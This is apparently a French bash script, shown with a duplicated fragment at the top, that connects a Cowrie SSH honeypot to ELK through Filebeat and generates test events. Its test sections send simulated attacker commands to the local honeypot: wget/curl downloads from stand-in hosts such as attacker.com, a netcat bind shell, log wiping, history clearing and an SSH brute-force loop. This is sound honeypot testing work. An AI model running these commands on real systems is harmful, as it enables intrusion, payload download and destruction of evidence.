print_success "✅ SCRIPTS UTILITAIRES CRÉÉS:"
echo "   • /opt/monitor_cowrie_elk.sh"
echo "   • /opt/test_cowrie_attacks.sh"
echo ""

print_warning "📋 PROCHAINES ÉTAPES:"
echo "1. Vérifier les données dans Kibana"
echo "2. Passer à l'étape 6.2 (FTP Honeypot)"
echo "3. Passer à l'étape 6.3 (HTTP Honeypot)"
echo ""

print_success "✅ COWRIE -> ELK INTEGRATION RÉUSSIE!"
echo ""

# Log final
echo "$(date): Étape 6.1 - Configuration Cowrie vers ELK terminée avec succès" >> /var/log/honeypot-setup.log
]
  fields:
    logstash_pipeline: cowrie
    honeypot_type: ssh
    honeypot_service: cowrie
    source_vm: honeypot-117
    log_source: text_format
    log_format: text
  fields_under_root: false
  close_inactive: 5m
  scan_frequency: 1s

# ==============================================================================
# OUTPUT VERS LOGSTASH
# ==============================================================================

output.logstash:
  hosts: ["192.168.2.124:5044"]
  worker: 2
  compression_level: 3
  ttl: 30s
  pipelining: 2
  loadbalance: true
  timeout: 10s

# ==============================================================================
# CONFIGURATION GÉNÉRALE
# ==============================================================================

name: "honeypot-cowrie-filebeat"
tags: ["cowrie", "honeypot", "ssh", "vm-117"]

processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~
  - timestamp:
      field: timestamp
      layouts:
        - '2006-01-02T15:04:05.999999Z'
        - '2006-01-02T15:04:05.999Z'
        - '2006-01-02T15:04:05Z'
      test:
        - '2023-10-15T14:30:45.123456Z'

# ==============================================================================
# LOGGING ET MONITORING
# ==============================================================================

logging.level: info
logging.to_files: true
logging.files:
  path: /var/log/filebeat
  name: filebeat
  keepfiles: 7
  permissions: 0644

monitoring.enabled: true

# ==============================================================================
# PERFORMANCE ET SÉCURITÉ
# ==============================================================================

queue.mem:
  events: 4096
  flush.min_events: 512
  flush.timeout: 5s

max_procs: 2
EOF

# Fixer les permissions
chown root:root /etc/filebeat/filebeat.yml
chmod 600 /etc/filebeat/filebeat.yml

print_success "✓ Configuration Filebeat créée"

# ==============================================================================
# ÉTAPE 5 : DÉMARRAGE ET TEST DES SERVICES
# ==============================================================================

print_status "Démarrage des services..."

# Redémarrer Cowrie avec la nouvelle configuration
systemctl restart cowrie
sleep 3

if systemctl is-active cowrie >/dev/null 2>&1; then
    print_success "✓ Cowrie redémarré avec succès"
else
    print_error "Échec du redémarrage de Cowrie"
    systemctl status cowrie
    exit 1
fi

# Démarrer Filebeat
systemctl enable filebeat
systemctl start filebeat
sleep 3

if systemctl is-active filebeat >/dev/null 2>&1; then
    print_success "✓ Filebeat démarré avec succès"
else
    print_error "Échec du démarrage de Filebeat"
    systemctl status filebeat
    exit 1
fi

# ==============================================================================
# ÉTAPE 6 : TESTS ET VALIDATION
# ==============================================================================

print_status "Tests et validation..."

# Vérifier que les fichiers de log sont créés
sleep 5

if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json" ]; then
    print_success "✓ Fichier de log JSON créé"
else
    print_warning "⚠ Fichier de log JSON pas encore créé"
fi

# Génération d'événements de test
print_status "Génération d'événements de test..."

# Test 1: Connexion SSH avec échec d'authentification
print_status "Test 1: Tentative de connexion SSH..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@127.0.0.1
expect "password:"
send "admin123\r"
expect "password:"
send "password\r"
expect "password:"
send "root\r"
expect eof
EOF

sleep 2

# Test 2: Connexion SSH avec succès et commandes
print_status "Test 2: Connexion SSH avec commandes..."
expect << 'EOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "whoami\r"
expect "root@srv-prod-web01:~#"
send "ls -la\r"
expect "root@srv-prod-web01:~#"
send "cat /etc/passwd\r"
expect "root@srv-prod-web01:~#"
send "wget http://malware.example.com/shell.sh\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EOF

sleep 5

# Vérifier les logs
print_status "Vérification des logs générés..."

if [ -f "$COWRIE_PATH/var/log/cowrie/cowrie.json" ]; then
    LOG_COUNT=$(wc -l < "$COWRIE_PATH/var/log/cowrie/cowrie.json")
    if [ "$LOG_COUNT" -gt 0 ]; then
        print_success "✓ $LOG_COUNT événements générés dans cowrie.json"
        print_status "Derniers événements:"
        tail -3 "$COWRIE_PATH/var/log/cowrie/cowrie.json" | jq -r '.eventid + " - " + .message' 2>/dev/null || tail -3 "$COWRIE_PATH/var/log/cowrie/cowrie.json"
    else
        print_warning "⚠ Aucun événement dans cowrie.json"
    fi
fi

# Test de connectivité Filebeat
print_status "Test de connectivité Filebeat..."
if systemctl is-active filebeat >/dev/null 2>&1; then
    FB_LOGS=$(journalctl -u filebeat -n 10 --no-pager | grep -i "connection\|error\|success" | tail -3)
    if [ -n "$FB_LOGS" ]; then
        print_status "Logs Filebeat récents:"
        echo "$FB_LOGS"
    fi
fi

# ==============================================================================
# ÉTAPE 7 : VÉRIFICATION DANS ELASTICSEARCH
# ==============================================================================

print_status "Vérification dans Elasticsearch..."

# Attendre que les données arrivent dans ELK
sleep 10

# Vérifier les données dans Elasticsearch
ES_CHECK=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)

if [ "$ES_CHECK" ] && [ "$ES_CHECK" -gt 0 ]; then
    print_success "✓ $ES_CHECK événements Cowrie indexés dans Elasticsearch"
    
    # Afficher quelques exemples
    print_status "Exemples d'événements indexés:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=3&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "\(.["@timestamp"]) - \(.eventid) - \(.src_ip // .client_ip) - \(.message)"' 2>/dev/null
else
    print_warning "⚠ Aucun événement Cowrie trouvé dans Elasticsearch"
    print_status "Vérification des indices disponibles:"
    curl -s "http://$ELK_SERVER:9200/_cat/indices/honeypot-*?v"
fi

# ==============================================================================
# ÉTAPE 8 : CRÉATION D'UN SCRIPT DE MONITORING
# ==============================================================================

print_status "Création du script de monitoring..."

cat > /opt/monitor_cowrie_elk.sh << 'EOF'
#!/bin/bash

# Script de monitoring Cowrie -> ELK
# Vérifie que les données arrivent correctement

ELK_SERVER="192.168.2.124"
COWRIE_LOG="/home/cowrie/cowrie/var/log/cowrie/cowrie.json"

echo "=== MONITORING COWRIE -> ELK ==="
echo "Timestamp: $(date)"
echo ""

# Vérifier les services
echo "SERVICES:"
echo "- Cowrie: $(systemctl is-active cowrie)"
echo "- Filebeat: $(systemctl is-active filebeat)"
echo ""

# Vérifier les logs locaux
if [ -f "$COWRIE_LOG" ]; then
    LOG_COUNT=$(wc -l < "$COWRIE_LOG")
    echo "LOGS LOCAUX:"
    echo "- Événements dans cowrie.json: $LOG_COUNT"
    echo "- Dernier événement: $(tail -1 "$COWRIE_LOG" | jq -r '.timestamp + " - " + .eventid' 2>/dev/null)"
    echo ""
fi

# Vérifier dans Elasticsearch
echo "ELASTICSEARCH:"
ES_COUNT=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=0" | jq -r '.hits.total.value // .hits.total' 2>/dev/null)
echo "- Événements indexés: $ES_COUNT"

if [ "$ES_COUNT" ] && [ "$ES_COUNT" -gt 0 ]; then
    echo "- Dernier événement ES:"
    curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*/_search?size=1&sort=@timestamp:desc" | jq -r '.hits.hits[]._source | "  " + .["@timestamp"] + " - " + .eventid + " - " + (.src_ip // .client_ip)' 2>/dev/null
fi

echo ""
echo "=== FIN MONITORING ==="
EOF

chmod +x /opt/monitor_cowrie_elk.sh

# ==============================================================================
# ÉTAPE 9 : CRÉATION D'UN SCRIPT DE TEST
# ==============================================================================

print_status "Création du script de test..."

cat > /opt/test_cowrie_attacks.sh << 'EOF'
#!/bin/bash

# Script de test pour générer des attaques Cowrie
# Simule différents types d'attaques SSH

echo "=== GÉNÉRATION D'ATTAQUES COWRIE ==="
echo "Timestamp: $(date)"
echo ""

# Test 1: Brute force SSH
echo "Test 1: Brute force SSH..."
for user in admin root test administrator; do
    for pass in 123456 password admin root; do
        timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$user@127.0.0.1" "echo test" 2>/dev/null &
    done
done

sleep 3

# Test 2: Connexion avec commandes malveillantes
echo "Test 2: Connexion avec commandes malveillantes..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://malware.example.com/cryptominer\r"
expect "root@srv-prod-web01:~#"
send "wget http://attacker.com/backdoor.sh\r"
expect "root@srv-prod-web01:~#"
send "nc -l -p 4444 -e /bin/bash\r"
expect "root@srv-prod-web01:~#"
send "rm -rf /var/log/*\r"
expect "root@srv-prod-web01:~#"
send "history -c\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

sleep 3

# Test 3: Tentatives de téléchargement
echo "Test 3: Tentatives de téléchargement..."
expect << 'EXPECTEOF' &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 ubuntu@127.0.0.1
expect "password:"
send "ubuntu\r"
expect "root@srv-prod-web01:~#"
send "wget http://example.com/malware.exe\r"
expect "root@srv-prod-web01:~#"
send "curl -O http://badsite.com/shell.php\r"
expect "root@srv-prod-web01:~#"
send "exit\r"
expect eof
EXPECTEOF

echo ""
echo "Tests terminés. Vérifiez les logs dans 10 secondes..."
sleep 10

# Afficher les résultats
echo ""
echo "=== RÉSULTATS ==="
if [ -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json ]; then
    echo "Nouveaux événements générés:"
    tail -10 /home/cowrie/cowrie/var/log/cowrie/cowrie.json | jq -r '.eventid + " - " + .message' 2>/dev/null
fi
EOF

chmod +x /opt/test_cowrie_attacks.sh

# ==============================================================================
# RÉSUMÉ ET FINALISATION
# ==============================================================================

print_status "=== ÉTAPE 6.1 TERMINÉE AVEC SUCCÈS ==="
echo ""

print_success "✅ CONFIGURATION TERMINÉE:"
echo "   • Cowrie configuré avec outputs multiples"
echo "   • Filebeat installé et configuré"
echo "   • Services démarrés et opérationnels"
echo "   • Tests d'intégration exécutés"
echo "   • Scripts de monitoring créés"
echo ""

print_success "✅ OUTPUTS COWRIE CONFIGURÉS:"
echo "   • JSON vers fichier (pour Filebeat)"
echo "   • TCP direct vers Logstash"
echo "   • Logs texte (backup)"
echo ""

print_success "✅ FILEBEAT CONFIGURÉ:"
echo "   • Collecte des logs JSON et texte"
echo "   • Envoi vers Logstash (port 5044)"
echo "   • Métadonnées honeypot ajoutées"
echo ""

print_success "✅ SCRIPTS UTILITAIRES CRÉÉS:"
echo "   • /opt/monitor_cowrie_elk.sh"
echo "   • /opt/test_cowrie_attacks.sh"
echo ""

print_warning "📋 PROCHAINES ÉTAPES:"
echo "1. Vérifier les données dans Kibana"
echo "2. Passer à l'étape 6.2 (FTP Honeypot)"
echo "3. Passer à l'étape 6.3 (HTTP Honeypot)"
echo ""

print_success "✅ COWRIE -> ELK INTEGRATION RÉUSSIE!"
echo ""

# Log final
echo "$(date): Étape 6.1 - Configuration Cowrie vers ELK terminée avec succès" >> /var/log/honeypot-setup.log